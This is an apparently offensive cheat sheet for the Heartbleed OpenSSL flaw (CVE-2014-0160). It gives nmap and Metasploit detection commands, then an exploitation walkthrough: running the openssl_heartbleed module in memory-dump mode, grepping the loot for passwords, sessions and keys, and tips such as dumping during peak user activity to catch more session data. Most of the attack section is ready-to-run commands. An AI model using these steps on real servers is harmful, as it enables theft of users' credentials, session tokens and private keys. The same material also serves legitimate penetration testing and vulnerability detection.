

## Overview

- **CVE**: CVE-2014-0160
- **Affected Versions**: OpenSSL 1.0.1 through 1.0.1f (excluding 1.0.1g)
- **Description**: Exploits a flaw in OpenSSL's heartbeat extension, allowing attackers to read up to 64 KB of server memory with each request.
- **Impact**: Exposes sensitive data such as:
    - User credentials
    - Session tokens
    - Private keys
    - Confidential data in memory

---

## Detection

### Using Nmap

```bash
# Scan for Heartbleed vulnerability
nmap --script ssl-heartbleed -p 443 <target_ip>
```

### Using Metasploit

```bash
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS <target_ip>
set VERBOSE true
check
```

---

## Exploitation Steps

### 1. Verifying Vulnerability

```bash
# Confirm OpenSSL version on the target
nmap -sV --version-light -p 443 <target_ip>
```

### 2. Dumping Memory Using Metasploit

```bash
# Set up the exploit module
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS <target_ip>
set ACTION DUMP  # Enables memory dump action
set VERBOSE true
run
```

### 3. Analyzing Dumped Memory

```bash
# Navigate to the location of dumped files
cd ~/.msf4/loot/

# Extract readable strings from the dump
strings <dumped_file>.bin > readable_dump.txt

# Search for potential sensitive data
grep -i "password" readable_dump.txt
grep -i "user" readable_dump.txt
grep -i "session" readable_dump.txt
grep -i "key" readable_dump.txt
```

---

## Tips for Effective Exploitation

1. **Multiple Dump Attempts**
    
    - Memory content changes over time.
    - Perform several dumps to increase chances of finding useful data.
2. **Key Data to Look For**
    
    - Authentication credentials
    - Session tokens
    - Private keys
    - Email addresses
    - Form submission data
3. **Time and User Activity**
    
    - Exploit during peak user activity to increase chances of retrieving valuable session data.
4. **Organize Findings**
    
    - Keep a record of dump attempts, including timestamps.
    - Save and categorize unique or sensitive data.

---

## Limitations

- Success depends on the data present in memory at the time of exploitation.
- Multiple attempts may be necessary to retrieve relevant information.
- Not all dumps will contain sensitive data.
- Exploitation attempts may be logged on the server.

---
